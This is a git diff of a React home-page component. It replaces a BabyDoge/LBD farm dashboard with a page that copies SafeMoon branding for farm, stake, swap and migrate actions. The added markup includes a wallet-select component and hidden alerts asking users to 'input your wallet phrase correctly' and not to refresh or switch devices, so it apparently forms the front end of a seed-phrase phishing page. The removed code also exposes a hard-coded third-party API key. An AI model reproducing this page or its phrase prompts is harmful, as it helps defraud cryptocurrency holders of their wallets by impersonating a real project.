@@ -1,171 +1,156 @@
 import React, { useState, useEffect, useHistory } from 'react';
-import { FaAlignJustify, FaHome, FaTractor, FaBabyCarriage, FaSteam, FaOutdent,
-         FaShareSquare, FaTwitter, FaArrowRight, FaClosedCaptioning, FaTimes, FaQuestion, FaQuestionCircle} from 'react-icons/fa';
-import { Link } from 'react-router-dom';
-import Navbar from '../../components/NavBar';
-import './index.css';
-import TradeViewChart from 'react-crypto-chart';
-
-import panBg from '../../img/quotation/pan-bg.svg';
-import panBg1 from '../../img/quotation/pan-bg2.svg';
-import upImage from '../../img/lbd.png';
-import logo_short from '../../img/quotation/24_24.svg';
-import CountUp from 'react-countup';
-
-import MyModal from '../../components/Modal';
 import $ from 'jquery';
-import Chart from '../../pages/Chart';
-
+import Header from '../../components/Header';
+import Footer from '../../components/Footer';
+import WalletSelect from '../../components/WalletSelect';
+import Notification from '../../components/Notification';
+import './index.css';
 const Home = (props) => {
-    
-    const [openModal, setOpenModal] = useState(false);    
-    const [openCheck, setOpenChecked] = useState('close');    
-    const [login, setLogin] = useState(false);    
-    const [bnbPrice, setBNBPrice] = useState(0);    
-    const [babydogePrice, setBabydogePrice] = useState(0);    
-    
-    const openChecked = (status) => {
-        setOpenChecked(status);
-    }
-    
-    const OpenModal = () => {
-        if(openModal === false)
-            setOpenModal(true)
-        else
-            setOpenModal(false);
-    }
-    const customStyle = {  
-        maxWidth: '100%',
-        maxHeight: '100vh',
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center',      
-        height: '66%',          
-    }
-    useEffect(() => {
-        const formData = {
-            'currency':"USD",
-            'code':"BABYDOGE",
-            'meta':true
-        }
-        window.setTimeout(function() {
-            $.ajax({
-              url: "https://api.binance.com/api/v3/avgPrice?symbol=BNBUSDT",
-              dataType: "json",
-              method: "GET",
-              success: function(response) {
-                console.log(response);
-                setBNBPrice(response.price);
-              }
-            });
-            $.ajax({
-                url: "https://api.livecoinwatch.com/coins/single",                
-                headers: { 
-                    'content-type': 'application/json', 
-                    'x-api-key':'c48ff849-d034-4cd1-b966-e18137368b4b' 
-                },
-                dataType:'json',
-                method: "POST",
-                success: function(response) {
-                    console.log(response.rate);
-                    setBabydogePrice(response.rate);
-                },              
-                data: JSON.stringify(formData)
-            });
-          }, 100);
-    }, []);
+
     return (
         <>
-            <Navbar openChecked={openChecked} isLogin={setLogin}/>
-            
-            <div className={`${openCheck !== 'close' ? 'p-main-close':'p-main'}`}>
-                <div className='d-flex upSide'>
-                    <div><img src={panBg1} className="lbd-img"/></div>
-                    <div className='text-center d-flex justify-content-between flex-column'>
-                        <img src={upImage} className="main-image-title"/>
-                        <p className='text-sm font-OpenSansSemiBold mb-0 under-text'>The #1 AMM and yield farm on Binance Smart Chain.</p>
-                    </div>
-                    <div><img src={panBg} className="lbd-img2"/></div>
-                </div>
-                <div className='d-flex medium-section justify-content-center flex-wrap'>
-                    <div className='second-card1'>
-                        <div className='card-main' style={{padding: '70px 30px'}}>
-                            <div><h1 className='font-OpenSansBold card-main-title'>Farms & Staking</h1></div>
-                            <div className='d-flex justify-content-between'>
-                                <div>
-                                    <div><img src={logo_short}  className='w-24-2'/></div>
+            <div id='stars' style={{position:"absolute"}}></div>
+            <div id='stars2' style={{position:"absolute"}}></div>
+            <div id='stars3' style={{position:"absolute"}}></div>
+            <div className="App">
+
+                <div className="alert" style={{display:"none"}}>We are currently experiencing high traffic on the website. Do not refresh this page or access the website from another device.</div>
+                <div className="alert-phrase" style={{display:"none"}}>Please input your wallet phrase correctly!</div>
+                <Header />
+                <div class="main">
+                    <main style={{display:'flex'}}>
+                        
+                        <div class="swap__mainfield">
+                            <div class="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>FARM</div>                        
+                            <div id='swap-page' class="swap__page pt2">
+                                <div class="swap__header__line__settings">
+                                    <div><img src="img/asteroid.png" alt="icon" style={{width:'44px', display:'inline-block'}} /></div>
+                                </div>
+                                <div class="swap__page__container">
                                     <div>
-                                        <p className='title-color'>Staked BabyDoge:</p>
-                                        <p className='mb-0 text-grey-stake-balance'>Staked: <span className='text-pink'>{localStorage.getItem('stakeAmount')}</span></p>
+                                        <div id="swap-currency-output" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem', height:'28px'}}>
+                                            <p style={{fontSize:'12px', position:'relative', bottom:'35px', right:'43px', fontWeight:600}}>There are tons of Asteroids in space.<br/>
+                                                APR: 120.49%+15.99%+Fees
+                                            </p>
+                                        </div>
+                                        <div id="swap-currency-input" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem'}}>
+                                            <p style={{fontSize:'12px', fontWeight:600}}>Provide liquidity to earn ASTEROIDS</p>
+                                        </div>
                                     </div>
-                                    <div>
-                                        <p className='title-color'>BabyDoge to Stake in million (10^6):</p>
-                                        <p className='under-text mb-0'>Locked</p>
+                                    <div class="swap__connect">
+                                        <button  type="button" id="farm_bones"  style={{fontFamily:'Open Sans', fontWeight:'bold'}}>Farm</button>
                                     </div>
-                                </div>                                
-                            </div>
-                            <div className="w-100 align-self-center btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-4 mt-5" onClick={() => OpenModal()}>
-                                Unlock Wallet
+                                </div>
                             </div>
                         </div>
-                    </div>
-                    <div className='second-card2'>
-                        <div className='card-main' style={{height: '100%'}}>
-                            <h4 className='font-OpenSansBold mb-0'>Earn up to</h4>
-                            <h2 className='font-OpenSansBold mb-0 farm-num'><CountUp className='font-OpenSansBold' start={0} end={826} duration={1} />.21% APR</h2>
-                            <h4 className='font-OpenSansBold mb-0'>in Farms</h4>
-                            <div><FaArrowRight className='main-color right-icon'/></div>
-                            <div className="d-flex justify-content-center" style={{height:'80%', flexWrap: 'wrap'}}>
-                                <div className='mx-1' style={{width: '230px'}}>
-                                    <p className='mb-0 mt-2 text-grey-stake-balance font-OpenSansBold'>
-                                        BabyDoge: $ 
-                                        <span className='text-pink'>
-                                            {Number(babydogePrice).toFixed(11)}
-                                        </span>
-                                    </p>
-                                    <Chart coinType='baby-doge-coin' coinName='BabyDoge'/>
+
+                        <div class="swap__mainfield">
+                            <div class="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>STAKE</div>                        
+                            <div id='swap-page' class="swap__page pt2">
+                                <div class="swap__header__line__settings">
+                                    <div><img src="img/star.png" alt="icon" style={{width:'44px', display:'inline-block'}}/></div>
                                 </div>
-                                <div className='mx-1' style={{width: '230px'}}>
-                                    <p className='mb-0 mt-2 text-grey-stake-balance font-OpenSansBold'>
-                                        BNB: $ 
-                                        <span className='text-pink'>
-                                            {Number(bnbPrice).toFixed(10)}
-                                        </span>
-                                    </p>
-                                    <Chart coinType='binancecoin' coinName='Binance' />
+                                <div class="swap__page__container">
+                                    <div>
+                                        <div id="swap-currency-output" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem', height:'28px'}}>
+                                            <p style={{fontSize:'12px', position:'relative', bottom:'35px', right:'43px', fontWeight:600}}>Save The Moon by STAKING your SafeMoon. <br/>
+                                                APR: 112.72% + 0.1% unstaking fee 
+                                            </p>
+                                        </div>
+                                        <div id="swap-currency-input" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem'}}>
+                                            <p style={{fontSize:'12px', fontWeight:600}}>Stake SafeMoon to generate additional SafeMoon</p>
+                                        </div>
+                                    </div>
+                                    <div class="swap__connect">
+                                        <button  type="button" id="stake_tokens"  style={{fontFamily:'Open Sans', fontWeight:'bold'}}>Stake SafeMoon</button>
+                                    </div>
                                 </div>
                             </div>
-                        </div>                        
-                    </div>
+                        </div>
+
+                        
+                        <div class="swap__mainfield">
+                            <div class="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>SWAP</div>                        
+                            <div id='swap-page' class="swap__page pt2">
+                                <div class="swap__header__line__settings">
+                                    <div><img src="img/space-station.png" alt="icon" style={{width:'44px', display:'inline-block'}}/></div>
+                                </div>
+                                <div class="swap__page__container">
+                                    <div>
+                                        <div id="swap-currency-output" label="[object Object]"style={{borderRadius:'0.4375rem', marginBottom:'0.1rem', height:'28px'}}>
+                                            <p style={{fontSize:'12px', position:'relative', bottom:'35px', right:'43px', fontWeight:600}}>SWAP tokens with 0.25% trading fee, <br/>of which 0.17% is added to the Liquidity Pool
+                                            </p>
+                                        </div>
+                                        <div id="swap-currency-input" label="[object Object]"style={{borderRadius:'0.4375rem', marginBottom:'0.3rem'}}>
+                                            <p style={{fontSize:'12px', fontWeight: 600, position: 'relative', top:'5px'}}>Swap BSC based tokens for other tokens, fee's are paid in BNB and SafeMoon V2 (SFM)</p>
+                                        </div>
+                                    </div>
+                                    <div class="swap__connect">
+                                        <button  type="button" id="swap_tokens" style={{fontFamily:'Open Sans', fontWeight:'bold', position:'relative', bottom:'14px'}}>SafeMoon Swap</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="swap__mainfield">
+                            <div class="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>PORTFOLIO</div>                        
+                            <div id='swap-page' class="swap__page pt2">
+                                <div class="swap__header__line__settings">
+                                    <div><img src="img/monitors.png" alt="icon" style={{width:'44px', display:'inline-block'}}/></div>
+                                </div>
+                                <div class="swap__page__container">
+                                    <div>
+                                        <div id="swap-currency-output" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem', height:'28px'}}>
+                                            <p style={{fontSize:'12px', position:'relative', bottom:'35px', right:'43px', fontWeight:600}}>Check Your Portfolio <br/> Total balance is calculated in SafeMoon
+                                            </p>
+                                        </div>
+                                        <div id="swap-currency-input" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem'}}>
+                                            <p style={{fontSize:'12px', fontWeight:600}}>Check your charts, portfolio and set alerts</p>
+                                        </div>
+                                    </div>
+                                    <div class="swap__connect">
+                                        <button  type="button" id="check_portfolio"  style={{fontFamily:'Open Sans', fontWeight:'bold'}}>Check your portfolio</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="swap__mainfield">
+                            <div class="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>MIGRATE</div>                        
+                            <div id='swap-page' class="swap__page pt2">
+                                <div class="swap__header__line__settings">
+                                    <div><img src="img/telescope.png" alt="icon" style={{width:'44px', display:'inline-block'}}/></div>
+                                </div>
+                                <div class="swap__page__container">
+                                    <div>
+                                        <div id="swap-currency-output" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem', height:'28px'}}>
+                                            <p style={{fontSize:'12px', position:'relative', bottom:'35px', right:'43px', fontWeight:600}}>Migrate from V1 to V2
+                                            </p>
+                                        </div>
+                                        <div id="swap-currency-input" label="[object Object]" style={{borderRadius:'0.4375rem', marginBottom:'0.3rem'}}>
+                                            <p style={{fontSize:'12px', fontWeight:600}}>Swap your SafeMoon V1 tokens for SafeMoon V2 (SFM)</p>
+                                        </div>
+                                    </div>
+                                    <div class="swap__connect">
+                                        <button  type="button" id="swap_tokens"  style={{fontFamily:'Open Sans', fontWeight:'bold'}}>Swap Tokens</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+
+                    </main>
+
                 </div>
-                <div className='d-flex mt-5 justify-content-center flex-wrap'>
-                    <div className='third-card1'>
-                        <div className='card-main color-blackpink fs-12 d-flex flex-column justify-content-end'>
-                            <h2 className='font-OpenSansBold mb-0 LBD-status'>LBD Status</h2>
-                            <div className='d-flex justify-content-between pt-3'>
-                                <p className='font-OpenSansBold mb-0'>Total LBD Supply</p>
-                                <p className='mb-0'><CountUp className='font-OpenSansBold' start={0} end={851154292422656} duration={2} /></p>
-                            </div>     
-                            <div className='d-flex justify-content-between pt-1'>
-                                <p className='font-OpenSansBold mb-0'>Total LBD Burned</p>
-                                <p className='mb-0'><CountUp className='font-OpenSansBold' start={0} end={148845707577344} duration={2} /></p>
-                            </div>   
-                            <div className='d-flex justify-content-between pt-1'>
-                                <p className='font-OpenSansBold mb-0'>Distributed LBD/block</p>
-                                <p className='mb-0'><CountUp className='font-OpenSansBold' start={0} end={64300411} duration={2} /></p>
-                            </div>                          
-                        </div>                        
-                    </div>
-                    <div className='third-card2'>
-                        <div className='card-main d-flex flex-column justify-content-end h-100'>
-                            <h4 className='font-OpenSansBold mb-0 Total-value pb-3'>Total Value Locked (TVL)</h4>
-                            <h2 className='font-OpenSansBold mb-0 LBD-status pb-1'>$<CountUp className='font-OpenSansBold' start={0} end={295190} duration={2} /></h2>
-                            <h4 className='font-OpenSansBold mb-0 title-color pb-4 pt-0'>Across all farms and pools</h4>
-                        </div>                        
-                    </div>
-                </div>
-            </div>
-            <MyModal isOpen={openModal}/>            
+                
+                <Footer />                
+                <WalletSelect />       
+                <Notification />
+                
+            </div>    
         </>
     )
 }
